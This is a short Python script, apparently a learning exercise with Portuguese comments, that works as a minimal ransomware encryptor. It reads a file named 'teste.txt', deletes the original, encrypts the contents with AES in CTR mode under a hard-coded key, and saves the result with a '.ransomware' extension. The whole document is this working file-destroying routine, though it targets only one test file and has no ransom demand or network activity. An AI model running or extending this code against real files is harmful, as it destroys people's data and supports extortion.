import os
import pyaes

## abrir o arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover o arquivo original

os.remove(file_name)

## definir a chave de encriptação

key = b'ransomwaretestab'
aes = pyaes.AESModeOfOperationCTR(key)

## criar novo arquivo criptografado

encrypt_data = aes.encrypt(file_data)

## salvar arquivo criptografado

new_file = file_name + '.ransomware'
new_file = open(f'{new_file}', 'wb')
new_file.write(encrypt_data)
new_file.close()

